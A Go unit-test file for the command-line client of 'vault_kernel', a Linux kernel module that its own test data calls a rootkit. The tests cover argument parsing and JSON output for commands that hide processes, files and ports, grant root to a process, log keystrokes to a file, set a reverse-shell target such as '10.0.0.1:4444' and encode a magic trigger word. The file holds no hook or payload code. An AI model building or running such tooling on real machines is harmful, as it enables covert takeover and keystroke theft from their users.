package main

import (
	"bytes"
	"encoding/json"
	"os"
	"strings"
	"testing"

	"github.com/ruby570bocadito/vault-kernel/internal/vaultkernel"
)

// marshalStatsJSON owns the `stats --json` envelope: schema first-class,
// numeric values as numbers, the rest as strings.
func TestMarshalStatsJSON(t *testing.T) {
	raw := map[string]string{
		"module":          "vault_kernel",
		"version":         "3.11",
		"hooks_installed": "7",
		"hooks_planned":   "7",
		"module_hidden":   "0",
		"hidden_files":    "1",
		"hidden_pids":     "1",
		"hidden_ports":    "1",
		"keylog_bytes":    "0",
		"uptime_s":        "42",
	}
	j, err := marshalStatsJSON(raw)
	if err != nil {
		t.Fatalf("marshalStatsJSON: %v", err)
	}
	var out map[string]interface{}
	if err := json.Unmarshal(j, &out); err != nil {
		t.Fatalf("invalid JSON: %v\n%s", err, j)
	}
	if out["schema"].(float64) != 1 {
		t.Errorf("schema = %v, want 1", out["schema"])
	}
	for _, k := range []string{"hooks_installed", "hooks_planned",
		"hidden_files", "hidden_pids", "hidden_ports",
		"keylog_bytes", "uptime_s", "module_hidden", "schema"} {
		if _, ok := out[k].(float64); !ok {
			t.Errorf("%s should marshal as a number, got %T (%v)", k, out[k], out[k])
		}
	}
	if out["module"] != "vault_kernel" || out["version"] != "3.11" {
		t.Errorf("string values mangled: module=%v version=%v", out["module"], out["version"])
	}
}

// marshalHiddenJSON owns the `list --json` envelope: schema + the three
// sections, empty ones as [] (never null).
func TestMarshalHiddenJSON(t *testing.T) {
	hl := ioctl.HiddenList{
		PIDs:  []int{1234, 567},
		Files: []string{"secret.txt", "my dir/with space.txt"},
		Ports: []int{8080},
	}
	j, err := marshalHiddenJSON(hl)
	if err != nil {
		t.Fatalf("marshalHiddenJSON: %v", err)
	}
	var out struct {
		Schema int      `json:"schema"`
		PIDs   []int    `json:"pids"`
		Files  []string `json:"files"`
		Ports  []int    `json:"ports"`
	}
	if err := json.Unmarshal(j, &out); err != nil {
		t.Fatalf("invalid JSON: %v\n%s", err, j)
	}
	if out.Schema != 1 {
		t.Errorf("schema = %d, want 1", out.Schema)
	}
	if len(out.PIDs) != 2 || out.PIDs[0] != 1234 || len(out.Files) != 2 ||
		out.Files[1] != "my dir/with space.txt" || len(out.Ports) != 1 {
		t.Errorf("sections mangled: %+v", out)
	}

	empty := ioctl.HiddenList{PIDs: []int{}, Files: []string{}, Ports: []int{}}
	je, err := marshalHiddenJSON(empty)
	if err != nil {
		t.Fatalf("marshalHiddenJSON(empty): %v", err)
	}
	if string(je) == "" || json.Valid(je) == false {
		t.Fatalf("empty envelope invalid: %s", je)
	}
	var outE map[string]interface{}
	json.Unmarshal(je, &outE)
	for _, k := range []string{"pids", "files", "ports"} {
		if arr, ok := outE[k].([]interface{}); !ok || len(arr) != 0 {
			t.Errorf("empty %s must marshal as [], got %v", k, outE[k])
		}
	}
}

// The doctor envelope always carries schema + client_version, and the
// v3.7 parity fix keeps device_open/stats_responds present (as false)
// when their check ran and failed — pointer fields, so they only
// disappear when the check never ran.
func TestDoctorJSONEnvelopeParity(t *testing.T) {
	openOK := false
	statsOK := false
	rep := doctorReport{
		Schema:        jsonSchemaVersion,
		ClientVersion: clientVersion,
		DevicePresent: true,
		DeviceOpen:    &openOK,
		StatsResponds: &statsOK,
		Warnings:      2,
	}
	j, err := json.MarshalIndent(&rep, "", "  ")
	if err != nil {
		t.Fatalf("marshal doctorReport: %v", err)
	}
	var out map[string]interface{}
	if err := json.Unmarshal(j, &out); err != nil {
		t.Fatalf("invalid JSON: %v\n%s", err, j)
	}
	if out["schema"].(float64) != 1 {
		t.Errorf("schema = %v, want 1", out["schema"])
	}
	if out["client_version"] != clientVersion {
		t.Errorf("client_version = %v, want %s", out["client_version"], clientVersion)
	}
	if b, ok := out["device_open"].(bool); !ok || b {
		t.Errorf("device_open must be present and false on failed open, got %v", out["device_open"])
	}
	if b, ok := out["stats_responds"].(bool); !ok || b {
		t.Errorf("stats_responds must be present and false on failed stats, got %v", out["stats_responds"])
	}
}

// parseGiveRootPID owns the give-root argument contract: no argument
// (or 0) = self (documented kernel contract, pid <= 0 escalates the
// caller), numeric PID passes through, NON-NUMERIC is a usage error —
// v3.8 parity fix: the discarded Atoi error used to turn
// `give-root abc` into a silent SELF escalation (the Python CLI
// rejects it via argparse type=int).
func TestParseGiveRootPID(t *testing.T) {
	// No argument → self (0).
	pid, err := parseGiveRootPID(nil)
	if err != nil || pid != 0 {
		t.Errorf("no args: got (%d, %v), want (0, nil)", pid, err)
	}
	// Numeric PID passes through, negatives included (pid <= 0 =
	// caller per the kernel contract).
	for _, tc := range []struct {
		in   string
		want int
	}{
		{"1234", 1234},
		{"1", 1},
		{"-5", -5},
		{"0", 0},
	} {
		pid, err := parseGiveRootPID([]string{tc.in})
		if err != nil || pid != tc.want {
			t.Errorf("parseGiveRootPID(%q) = (%d, %v), want (%d, nil)", tc.in, pid, err, tc.want)
		}
	}
	// Non-numeric → usage error, never a silent self-root.
	for _, bad := range []string{"abc", "12x", "1.5", ""} {
		pid, err := parseGiveRootPID([]string{bad})
		if err == nil {
			t.Errorf("parseGiveRootPID(%q) = (%d, nil), want error", bad, pid)
		}
		if pid != 0 {
			t.Errorf("parseGiveRootPID(%q) must not return a pid on error, got %d", bad, pid)
		}
	}
	// Extra positional args are rejected (strict grammar).
	if _, err := parseGiveRootPID([]string{"1", "2"}); err == nil {
		t.Errorf("extra args must be rejected, got nil error")
	}
}

// parseKeylogArgs owns the keylog grammar: keylog [--follow [ms]]
// [--timestamps].  The interval stays positional after --follow;
// --timestamps is accepted anywhere but only together with --follow.
// v3.8: before this parser existed, unknown args in the one-shot path
// were silently ignored (`keylog 500` behaved as `keylog`).
func TestParseKeylogArgs(t *testing.T) {
	// Bare keylog: one-shot, default interval.
	opts, err := parseKeylogArgs(nil)
	if err != nil || opts.follow || opts.timestamps || opts.intervalMs != keylogDefaultIntervalMs {
		t.Errorf("no args: got %+v, %v", opts, err)
	}
	// --follow alone: default interval.
	opts, err = parseKeylogArgs([]string{"--follow"})
	if err != nil || !opts.follow || opts.timestamps || opts.intervalMs != keylogDefaultIntervalMs {
		t.Errorf("--follow: got %+v, %v", opts, err)
	}
	// Positional interval after --follow.
	opts, err = parseKeylogArgs([]string{"--follow", "200"})
	if err != nil || !opts.follow || opts.intervalMs != 200 {
		t.Errorf("--follow 200: got %+v, %v", opts, err)
	}
	// --timestamps in any position, with --follow.
	for _, tc := range [][]string{
		{"--follow", "--timestamps"},
		{"--timestamps", "--follow"},
		{"--follow", "200", "--timestamps"},
	} {
		opts, err = parseKeylogArgs(tc)
		if err != nil || !opts.follow || !opts.timestamps {
			t.Errorf("%v: got %+v, %v", tc, opts, err)
		}
	}
	// --timestamps without --follow → usage error in both clients.
	if _, err := parseKeylogArgs([]string{"--timestamps"}); err == nil {
		t.Errorf("--timestamps without --follow must error")
	}
	// Interval below the 50 ms floor → error (unchanged contract).
	if _, err := parseKeylogArgs([]string{"--follow", "10"}); err == nil {
		t.Errorf("--follow 10 must error (min 50)")
	}
	// Non-numeric interval → error.
	if _, err := parseKeylogArgs([]string{"--follow", "abc"}); err == nil {
		t.Errorf("--follow abc must error")
	}
	// Unknown/stray args → usage error (was: silently ignored).
	if _, err := parseKeylogArgs([]string{"--bogus"}); err == nil {
		t.Errorf("unknown flag must error")
	}
	if _, err := parseKeylogArgs([]string{"500"}); err == nil {
		t.Errorf("positional interval without --follow must error")
	}
	if _, err := parseKeylogArgs([]string{"--follow", "200", "300"}); err == nil {
		t.Errorf("second positional interval must error")
	}
}

// formatKeylogEvent is the user-facing contract of one follow event,
// mirrored by format_keylog_event in the Python CLI: timestamps put
// every event on a fresh [HH:MM:SS]-prefixed line; without them a
// suffix diff continues the line and a wrap starts a new one.
func TestFormatKeylogEvent(t *testing.T) {
	// Continuation without timestamps: raw suffix, no newline.
	if got := formatKeylogEvent("def", "10:30:05", false, false); got != "def" {
		t.Errorf("continuation no-ts = %q, want %q", got, "def")
	}
	// Buffer wrap without timestamps: newline before the replay.
	if got := formatKeylogEvent("wrapped", "10:30:05", false, true); got != "\nwrapped" {
		t.Errorf("wrap no-ts = %q, want %q", got, "\nwrapped")
	}
	// With timestamps: BOTH cases start on a fresh [HH:MM:SS] line.
	if got := formatKeylogEvent("def", "10:30:05", true, false); got != "\n[10:30:05] def" {
		t.Errorf("continuation ts = %q, want %q", got, "\n[10:30:05] def")
	}
	if got := formatKeylogEvent("wrapped", "10:30:05", true, true); got != "\n[10:30:05] wrapped" {
		t.Errorf("wrap ts = %q, want %q", got, "\n[10:30:05] wrapped")
	}
	// Content is never mangled by the formatter.
	if got := formatKeylogEvent("my dir/with space.txt", "00:00:00", true, false); !strings.HasSuffix(got, "my dir/with space.txt") {
		t.Errorf("content mangled: %q", got)
	}
}

// v3.9: --output extends the keylog grammar. It takes exactly one FILE
// operand, may appear once, composes with --follow/--timestamps, and a
// missing operand is a usage error (same strictness as the interval).
// parseKeylogArgs v3.11: the --stop-after grammar — follow-only,
// required numeric operand >= 1, at most once.
func TestParseKeylogArgsStopAfter(t *testing.T) {
	// Valid: --follow --stop-after N (any order).
	for _, args := range [][]string{
		{"--follow", "--stop-after", "5"},
		{"--stop-after", "5", "--follow"},
		{"--follow", "--stop-after", "1"},
	} {
		opts, err := parseKeylogArgs(args)
		if err != nil || !opts.follow || opts.stopAfter != 5 && opts.stopAfter != 1 {
			t.Errorf("parseKeylogArgs(%v) = (%+v, %v)", args, opts, err)
		}
	}
	// Without --follow it is a usage error (one-shot reads one buffer).
	if _, err := parseKeylogArgs([]string{"--stop-after", "5"}); err == nil ||
		!strings.Contains(err.Error(), "--stop-after requires --follow") {
		t.Errorf("--stop-after without --follow must error, got %v", err)
	}
	// Missing operand.
	if _, err := parseKeylogArgs([]string{"--follow", "--stop-after"}); err == nil {
		t.Errorf("--stop-after without operand must error")
	}
	// Zero and negative.
	if _, err := parseKeylogArgs([]string{"--follow", "--stop-after", "0"}); err == nil {
		t.Errorf("--stop-after 0 must error")
	}
	if _, err := parseKeylogArgs([]string{"--follow", "--stop-after", "-3"}); err == nil {
		t.Errorf("--stop-after -3 must error")
	}
	// Non-numeric.
	if _, err := parseKeylogArgs([]string{"--follow", "--stop-after", "abc"}); err == nil {
		t.Errorf("--stop-after abc must error")
	}
	// Duplicated.
	if _, err := parseKeylogArgs([]string{"--follow", "--stop-after", "2", "--stop-after", "3"}); err == nil {
		t.Errorf("double --stop-after must error")
	}
	// Default stays 0 (unlimited).
	opts, err := parseKeylogArgs([]string{"--follow"})
	if err != nil || opts.stopAfter != 0 {
		t.Errorf("bare --follow: stopAfter = %d, err = %v", opts.stopAfter, err)
	}
}

func TestParseKeylogArgsOutput(t *testing.T) {
	// --output alone (one-shot) is valid: writes the buffer once.
	opts, err := parseKeylogArgs([]string{"--output", "/tmp/k.log"})
	if err != nil || opts.outputPath != "/tmp/k.log" || opts.follow {
		t.Errorf("--output /tmp/k.log: got %+v, %v", opts, err)
	}
	// Anywhere in the grammar, composed with follow+timestamps.
	opts, err = parseKeylogArgs([]string{"--follow", "--timestamps", "--output", "cap.log"})
	if err != nil || !opts.follow || !opts.timestamps || opts.outputPath != "cap.log" {
		t.Errorf("follow+ts+output: got %+v, %v", opts, err)
	}
	// Missing operand → usage error.
	if _, err := parseKeylogArgs([]string{"--output"}); err == nil {
		t.Errorf("--output without operand must error")
	}
	// Empty operand → usage error.
	if _, err := parseKeylogArgs([]string{"--output", ""}); err == nil {
		t.Errorf("--output '' must error")
	}
	// Second --output → usage error.
	if _, err := parseKeylogArgs([]string{"--output", "a", "--output", "b"}); err == nil {
		t.Errorf("double --output must error")
	}
}

// parseCaptureArgs owns the `capture` grammar: capture [--out FILE]
// [--stdout], --out exactly once with a required non-empty operand,
// --stdout at most once, anything else is a usage error. (v3.11 adds
// the --stdout boolean and the duplicated-flag check for it.)
func TestParseCaptureArgs(t *testing.T) {
	// Bare capture → stdout.
	if p, st, err := parseCaptureArgs(nil); err != nil || p != "" || st {
		t.Errorf("no args: got (%q, %v, %v), want (\"\", false, nil)", p, st, err)
	}
	// --out PATH.
	if p, st, err := parseCaptureArgs([]string{"--out", "/tmp/e.json"}); err != nil || p != "/tmp/e.json" || st {
		t.Errorf("--out: got (%q, %v, %v)", p, st, err)
	}
	// --stdout alone is accepted and redundant (scripts may pass it
	// unconditionally).
	if p, st, err := parseCaptureArgs([]string{"--stdout"}); err != nil || p != "" || !st {
		t.Errorf("--stdout alone: got (%q, %v, %v)", p, st, err)
	}
	// --out + --stdout in any order.
	if p, st, err := parseCaptureArgs([]string{"--stdout", "--out", "e.json"}); err != nil || p != "e.json" || !st {
		t.Errorf("--stdout --out: got (%q, %v, %v)", p, st, err)
	}
	if p, st, err := parseCaptureArgs([]string{"--out", "e.json", "--stdout"}); err != nil || p != "e.json" || !st {
		t.Errorf("--out --stdout: got (%q, %v, %v)", p, st, err)
	}
	// Duplicated --stdout.
	if _, _, err := parseCaptureArgs([]string{"--stdout", "--stdout"}); err == nil {
		t.Errorf("double --stdout must error")
	}
	// Missing operand.
	if _, _, err := parseCaptureArgs([]string{"--out"}); err == nil {
		t.Errorf("--out without operand must error")
	}
	// Empty operand.
	if _, _, err := parseCaptureArgs([]string{"--out", ""}); err == nil {
		t.Errorf("--out '' must error")
	}
	// Duplicated flag.
	if _, _, err := parseCaptureArgs([]string{"--out", "a", "--out", "b"}); err == nil {
		t.Errorf("double --out must error")
	}
	// Unknown token.
	if _, _, err := parseCaptureArgs([]string{"extra"}); err == nil {
		t.Errorf("stray token must error")
	}
}

// emitCaptureBundle is the v3.11 delivery matrix of `capture`:
// stdout-only, file+summary(stdout), file+JSON(stdout)+summary(stderr).
// The file side is verified with a temp directory; the stream side via
// os.Pipe captures.
func TestEmitCaptureBundle(t *testing.T) {
	j := []byte("{\"schema\": 1}")

	// 1. No outPath: JSON to stdout, no file.
	out := captureStdout(t, func() { _ = emitCaptureBundle(j, "", false) })
	if string(out) != "{\"schema\": 1}\n" {
		t.Errorf("stdout-only: got %q", out)
	}

	dir := t.TempDir()
	path := dir + "/ev.json"

	// 2. File without --stdout: summary to stdout, NOTHING to stdout as JSON.
	out = captureStdout(t, func() { _ = emitCaptureBundle(j, path, false) })
	if string(out) != "[+] Evidence bundle written to "+path+" (14 bytes)\n" {
		t.Errorf("file mode stdout: got %q", out)
	}
	data, err := os.ReadFile(path)
	if err != nil || string(data) != "{\"schema\": 1}\n" {
		t.Errorf("file mode content: %q err=%v", data, err)
	}

	// 3. File + --stdout: JSON to stdout, summary to stderr.
	os.Remove(path)
	out, errOut := captureStdoutStderr(t, func() { _ = emitCaptureBundle(j, path, true) })
	if string(out) != "{\"schema\": 1}\n" {
		t.Errorf("--stdout JSON: got %q", out)
	}
	if string(errOut) != "[+] Evidence bundle written to "+path+" (14 bytes)\n" {
		t.Errorf("--stdout summary (stderr): got %q", errOut)
	}
	info, err := os.Stat(path)
	if err != nil {
		t.Fatalf("--stdout file: %v", err)
	}
	if perm := info.Mode().Perm(); perm != 0600 {
		t.Errorf("--stdout file perm = %o, want 600", perm)
	}

	// 4. Unwritable path -> wrapped error.
	if err := emitCaptureBundle(j, dir+"/no/such/dir/ev.json", false); err == nil ||
		!strings.Contains(err.Error(), "capture: cannot write") {
		t.Errorf("unwritable path: err=%v", err)
	}
}

// captureStdout runs fn with os.Stdout redirected to a pipe and
// returns everything written to it.
func captureStdout(t *testing.T, fn func()) []byte {
	out, _ := captureStdoutStderr(t, func() {
		old := os.Stderr
		devnull, _ := os.OpenFile(os.DevNull, os.O_WRONLY, 0)
		os.Stderr = devnull
		fn()
		os.Stderr = old
		devnull.Close()
	})
	return out
}

// captureStdoutStderr runs fn with BOTH standard streams redirected to
// pipes and returns what each captured.
func captureStdoutStderr(t *testing.T, fn func()) ([]byte, []byte) {
	t.Helper()
	rOut, wOut, _ := os.Pipe()
	rErr, wErr, _ := os.Pipe()
	oldOut, oldErr := os.Stdout, os.Stderr
	os.Stdout, os.Stderr = wOut, wErr
	done := make(chan struct{})
	var outBuf, errBuf bytes.Buffer
	go func() {
		outBuf.ReadFrom(rOut)
		errBuf.ReadFrom(rErr)
		close(done)
	}()
	fn()
	wOut.Close()
	wErr.Close()
	os.Stdout, os.Stderr = oldOut, oldErr
	<-done
	return outBuf.Bytes(), errBuf.Bytes()
}

// keylogSink is the --output persistence: append-only, flushed per
// record, created 0600 because captures may contain keystrokes.
func TestKeylogSink(t *testing.T) {
	dir := t.TempDir()
	path := dir + "/cap.log"

	s, err := newKeylogSink(path)
	if err != nil {
		t.Fatalf("newKeylogSink: %v", err)
	}
	if err := s.writeRecord("\n[10:30:05] def\n"); err != nil {
		t.Fatalf("writeRecord: %v", err)
	}
	if err := s.writeRecord("ghi\n"); err != nil {
		t.Fatalf("writeRecord 2: %v", err)
	}
	s.close()

	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("read back: %v", err)
	}
	if string(data) != "\n[10:30:05] def\nghi\n" {
		t.Errorf("transcript mangled: %q", string(data))
	}

	// 0600 on creation — keystrokes are sensitive.
	st, err := os.Stat(path)
	if err != nil {
		t.Fatalf("stat: %v", err)
	}
	if perm := st.Mode().Perm(); perm != 0600 {
		t.Errorf("perm = %o, want 600", perm)
	}

	// Appending after reopen must not truncate (follow restarts).
	s2, err := newKeylogSink(path)
	if err != nil {
		t.Fatalf("reopen: %v", err)
	}
	s2.writeRecord("more\n")
	s2.close()
	data, _ = os.ReadFile(path)
	if !strings.HasSuffix(string(data), "ghi\nmore\n") {
		t.Errorf("append semantics broken: %q", string(data))
	}

	// Unwritable path → clear error.
	if _, err := newKeylogSink(dir + "/missing-dir/cap.log"); err == nil {
		t.Errorf("unwritable path must error")
	}
}

// buildCaptureReport assembles the 4th JSON document: envelope field
// order is contractual (SCHEMAS.md), stats reuse the stats --json
// numeric conversion, keylog text passes through verbatim.
func TestBuildCaptureReport(t *testing.T) {
	raw := map[string]string{
		"module":          "vault_kernel",
		"version":         "3.11",
		"hooks_installed": "7",
		"hooks_planned":   "7",
		"module_hidden":   "0",
		"hidden_files":    "1",
		"hidden_pids":     "1",
		"hidden_ports":    "1",
		"keylog_bytes":    "7",
		"uptime_s":        "42",
	}
	hidden := ioctl.HiddenList{
		PIDs:  []int{1234},
		Files: []string{"secret.txt"},
		Ports: []int{8080},
	}
	rep := buildCaptureReport(raw, hidden, "hello", "2026-09-15T10:30:05Z", false, clientVersion)

	if rep.Schema != jsonSchemaVersion {
		t.Errorf("schema = %d, want %d", rep.Schema, jsonSchemaVersion)
	}
	if rep.CapturedAt != "2026-09-15T10:30:05Z" || rep.ClientVersion != clientVersion {
		t.Errorf("envelope scalars mangled: %q %q", rep.CapturedAt, rep.ClientVersion)
	}
	if rep.ModuleInSysfs {
		t.Errorf("module_in_sysfs = true, want false")
	}
	if rep.Stats["hooks_installed"].(int) != 7 || rep.Stats["version"] != "3.11" {
		t.Errorf("stats conversion wrong: %v", rep.Stats)
	}
	if len(rep.Hidden.PIDs) != 1 || rep.Hidden.Files[0] != "secret.txt" {
		t.Errorf("hidden mangled: %+v", rep.Hidden)
	}
	if rep.Keylog != "hello" {
		t.Errorf("keylog text mangled: %q", rep.Keylog)
	}

	// The document must marshal with the contractual key order.
	j, err := json.MarshalIndent(rep, "", "  ")
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}
	order := []string{`"schema"`, `"captured_at"`, `"client_version"`,
		`"module_in_sysfs"`, `"stats"`, `"hidden"`, `"keylog"`}
	pos := 0
	for _, k := range order {
		idx := strings.Index(string(j)[pos:], k)
		if idx < 0 {
			t.Errorf("key %s missing or out of order in:\n%s", k, j)
			continue
		}
		pos += idx
	}
}

// v3.9 closes the systemic grammar gap: every simple command enforces
// strictArgs (exactly `want` operands) and parseFlagOnly (the optional
// flag alone). The audit found 15 of 20 dispatcher cases silently
// swallowing excess arguments while the Python client rejected them.
func TestStrictArgs(t *testing.T) {
	// Exact match passes.
	if err := strictArgs([]string{"a"}, 1, "usage"); err != nil {
		t.Errorf("strictArgs(a,1): %v", err)
	}
	// Missing operand.
	if err := strictArgs(nil, 1, "usage: x"); err == nil {
		t.Errorf("strictArgs(nil,1) must error")
	}
	// Excess operand names the first unexpected one.
	err := strictArgs([]string{"a", "b", "c"}, 1, "usage: x")
	if err == nil || !strings.Contains(err.Error(), "unexpected argument: b") {
		t.Errorf("strictArgs excess = %v, want unexpected 'b'", err)
	}
	// Zero-operand commands.
	if err := strictArgs(nil, 0, "usage: x"); err != nil {
		t.Errorf("strictArgs(nil,0): %v", err)
	}
	if err := strictArgs([]string{"extra"}, 0, "usage: x"); err == nil {
		t.Errorf("strictArgs(extra,0) must error")
	}
}

func TestParseFlagOnly(t *testing.T) {
	// Bare command.
	if ok, err := parseFlagOnly(nil, "--json", "usage"); ok || err != nil {
		t.Errorf("no args: got (%v, %v)", ok, err)
	}
	// The flag once.
	if ok, err := parseFlagOnly([]string{"--json"}, "--json", "usage"); !ok || err != nil {
		t.Errorf("--json: got (%v, %v)", ok, err)
	}
	// Anything else is a usage error.
	for _, bad := range [][]string{{"extra"}, {"--json", "extra"}, {"--bogus"}, {"--json", "--json"}} {
		if ok, err := parseFlagOnly(bad, "--json", "usage"); ok || err == nil {
			t.Errorf("parseFlagOnly(%v) = (%v, %v), want error", bad, ok, err)
		}
	}
}

// parsePIDArg (hide-pid/unhide-pid): numeric and >= 1. 0/negative PIDs
// were accepted before v3.9 and stored verbatim in the hide-list.
func TestParsePIDArg(t *testing.T) {
	for _, ok := range []string{"1", "42", "1234"} {
		if pid, err := parsePIDArg(ok); err != nil || pid != 42 && ok == "42" {
			t.Errorf("parsePIDArg(%q) = (%d, %v)", ok, pid, err)
		}
	}
	pid, err := parsePIDArg("42")
	if err != nil || pid != 42 {
		t.Errorf("parsePIDArg(42) = (%d, %v)", pid, err)
	}
	for _, bad := range []string{"0", "-5", "abc", "1.5", ""} {
		if _, err := parsePIDArg(bad); err == nil {
			t.Errorf("parsePIDArg(%q) must error", bad)
		}
	}
	// The combined wrapper also enforces the one-operand grammar.
	if _, err := parsePIDArgs([]string{"1", "2"}, "hide-pid"); err == nil {
		t.Errorf("extra args must error")
	}
	if _, err := parsePIDArgs(nil, "hide-pid"); err == nil {
		t.Errorf("missing pid must error")
	}
}

// parsePortArgs / parsePortArg: the 1-65535 check, previously
// duplicated inline three times, is one tested pure function.
func TestParsePortArg(t *testing.T) {
	if p, err := parsePortArg("8080"); err != nil || p != 8080 {
		t.Errorf("parsePortArg(8080) = (%d, %v)", p, err)
	}
	for _, bad := range []string{"0", "-1", "65536", "abc", ""} {
		if _, err := parsePortArg(bad); err == nil {
			t.Errorf("parsePortArg(%q) must error", bad)
		}
	}
	if _, err := parsePortArgs([]string{"80", "443"}, "hide-port"); err == nil {
		t.Errorf("extra args must error")
	}
}

// parseShellTarget: real ip:port validation. Before v3.9 the Go client
// only required "contains :", so `abc:def` reached the kernel and died
// with a raw EINVAL; the Python client validated nothing.
func TestParseShellTarget(t *testing.T) {
	valid := []string{"10.0.0.1:4444", "localhost:8080", "host-1:1", "203.0.113.9:65535"}
	for _, v := range valid {
		if err := parseShellTarget(v); err != nil {
			t.Errorf("parseShellTarget(%q) = %v, want nil", v, err)
		}
	}
	invalid := []string{
		"",               // empty
		"10.0.0.1",       // no colon
		":4444",          // empty host
		"10.0.0.1:",      // empty port
		"abc:def",        // non-numeric port
		"10.0.0.1:0",     // port < 1
		"10.0.0.1:-5",    // negative port
		"10.0.0.1:65536", // port > 65535
		"10.0.0.1:44:44", // trailing colon-split fails port parse
	}
	for _, bad := range invalid {
		if err := parseShellTarget(bad); err == nil {
			t.Errorf("parseShellTarget(%q) must error", bad)
		}
	}
}

// parseWatchArgs owns the watch grammar: default 1000 ms, --interval
// with a required >= 50 operand, extras rejected (before v3.9,
// `watch --interval 500 extra` silently ignored "extra").
func TestParseWatchArgs(t *testing.T) {
	// Bare watch: default.
	opts, err := parseWatchArgs(nil)
	if err != nil || opts.intervalMs != watchDefaultIntervalMs {
		t.Errorf("no args: got %+v, %v", opts, err)
	}
	// --interval MS.
	opts, err = parseWatchArgs([]string{"--interval", "250"})
	if err != nil || opts.intervalMs != 250 {
		t.Errorf("--interval 250: got %+v, %v", opts, err)
	}
	// Errors: missing operand, non-numeric, below floor, unknown flag,
	// stray positional.
	for _, bad := range [][]string{
		{"--interval"},
		{"--interval", "abc"},
		{"--interval", "10"},
		{"--interval", "-5"},
		{"extra"},
		{"--interval", "500", "extra"},
		{"--json"},
	} {
		if _, err := parseWatchArgs(bad); err == nil {
			t.Errorf("parseWatchArgs(%v) must error", bad)
		}
	}
}

// parseMagicEncodeArgs: exactly word+port; extras were silently
// ignored before v3.9.
func TestParseMagicEncodeArgs(t *testing.T) {
	word, port, err := parseMagicEncodeArgs([]string{"pwn", "4444"})
	if err != nil || word != "pwn" || port != 4444 {
		t.Errorf("magic-encode pwn 4444 = (%q, %d, %v)", word, port, err)
	}
	for _, bad := range [][]string{
		{},
		{"pwn"},
		{"pwn", "4444", "extra"},
		{"pwn", "0"},
		{"pwn", "abc"},
	} {
		if _, _, err := parseMagicEncodeArgs(bad); err == nil {
			t.Errorf("parseMagicEncodeArgs(%v) must error", bad)
		}
	}
}

// parseWatchArgs v3.10: --once joins the grammar in any position and
// combines freely with --interval; unknown tokens keep erroring.
func TestParseWatchArgsOnce(t *testing.T) {
	opts, err := parseWatchArgs([]string{"--once"})
	if err != nil || !opts.once || opts.intervalMs != watchDefaultIntervalMs {
		t.Errorf("--once: got %+v, %v", opts, err)
	}
	opts, err = parseWatchArgs([]string{"--interval", "250", "--once"})
	if err != nil || !opts.once || opts.intervalMs != 250 {
		t.Errorf("--interval 250 --once: got %+v, %v", opts, err)
	}
	opts, err = parseWatchArgs([]string{"--once", "--interval", "250"})
	if err != nil || !opts.once || opts.intervalMs != 250 {
		t.Errorf("--once --interval 250: got %+v, %v", opts, err)
	}
	for _, bad := range [][]string{
		{"--once", "extra"},
		{"--once", "--json"},
	} {
		if _, err := parseWatchArgs(bad); err == nil {
			t.Errorf("parseWatchArgs(%v) must error", bad)
		}
	}
}

// parseModinfo: exact keys, first occurrence wins, empty values
// skipped, case-insensitive; nil when no contract key appeared.
func TestParseModinfo(t *testing.T) {
	out := "filename:       /lib/modules/6.1.0/vault_kernel.ko\n" +
		"srcversion:     ABC123\n" +
		"version:        3.11\n" +
		"author:         ruby570bocadito\n" +
		"description:    vault_kernel kernel rootkit\n" +
		"license:        GPL\n"
	mi := parseModinfo(out)
	if mi == nil {
		t.Fatalf("parseModinfo returned nil for a complete output")
	}
	if mi.Filename != "/lib/modules/6.1.0/vault_kernel.ko" ||
		mi.Version != "3.11" || mi.Author != "ruby570bocadito" ||
		mi.Description != "vault_kernel kernel rootkit" {
		t.Errorf("fields mangled: %+v", mi)
	}
	// srcversion/license must NOT leak into the section.
	j, err := json.Marshal(mi)
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}
	if strings.Contains(string(j), "srcversion") || strings.Contains(string(j), "GPL") {
		t.Errorf("non-contract keys leaked: %s", j)
	}

	// Subset: only version present.
	mi = parseModinfo("version:  3.11\nlicense: GPL\n")
	if mi == nil || mi.Version != "3.11" || mi.Author != "" {
		t.Errorf("subset parse: %+v (want version only)", mi)
	}

	// Empty/unknown keys -> nil (section omitted).
	if mi := parseModinfo("license: GPL\nvermagic: 6.1.0\n"); mi != nil {
		t.Errorf("no contract keys: want nil, got %+v", mi)
	}
	if mi := parseModinfo(""); mi != nil {
		t.Errorf("empty output: want nil, got %+v", mi)
	}

	// Empty value for a contract key is skipped; first occurrence wins.
	mi = parseModinfo("version:\nversion: 3.11\n")
	if mi == nil || mi.Version != "3.11" {
		t.Errorf("empty-value handling: %+v", mi)
	}
}

// buildStatusReport pins the 5th JSON envelope: schema/device_present/
// module_in_sysfs always present, modinfo omitted (omitempty) when the
// modinfo probe did not run or found nothing.
func TestBuildStatusReport(t *testing.T) {
	mi := &modinfoInfo{Filename: "/x/vault_kernel.ko", Version: "3.11"}
	rep := buildStatusReport(true, false, mi)
	if rep.Schema != jsonSchemaVersion || !rep.DevicePresent || rep.ModuleInSysfs {
		t.Errorf("scalar fields wrong: %+v", rep)
	}
	j, err := json.MarshalIndent(rep, "", "  ")
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}
	var out map[string]interface{}
	if err := json.Unmarshal(j, &out); err != nil {
		t.Fatalf("invalid JSON: %v\n%s", err, j)
	}
	if out["schema"].(float64) != 1 || out["device_present"] != true ||
		out["module_in_sysfs"] != false {
		t.Errorf("envelope wrong: %s", j)
	}
	if _, ok := out["modinfo"].(map[string]interface{}); !ok {
		t.Errorf("modinfo section missing: %s", j)
	}

	// No modinfo probe: the key vanishes (never null).
	j, _ = json.Marshal(buildStatusReport(false, false, nil))
	out = map[string]interface{}{}
	json.Unmarshal(j, &out)
	if _, ok := out["modinfo"]; ok {
		t.Errorf("modinfo must be omitted without probe: %s", j)
	}
}

// v3.10: flag operands starting with '-' are a MISSING operand, never
// a file called "--follow" or "-foo" — parity with argparse, which
// rejects the same input with "expected one argument".
// posixOperandArgs pins the v3.11 parity table with the argparse
// surface (each cell reproduced against the Python client before
// coding — see the round report): bare dash-leading operands are
// rejected, the "--" escape hands them through, "-" and negative
// numbers stay verbatim, and give-root -5 keeps working.
// deviceRequired pins the v3.11 no-root contract: the pre-device
// commands never trigger the non-root warning (status is THE no-root
// check since v3.10); everything else warns.
func TestDeviceRequired(t *testing.T) {
	for _, cmd := range []string{"status", "version", "-v", "--version",
		"help", "-h", "--help", "magic-encode"} {
		if deviceRequired(cmd) {
			t.Errorf("deviceRequired(%q) = true, want false (no-root command)", cmd)
		}
	}
